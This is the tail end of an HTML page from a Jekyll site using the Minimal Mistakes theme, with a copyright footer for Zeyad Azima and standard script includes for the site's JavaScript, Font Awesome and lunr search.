<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
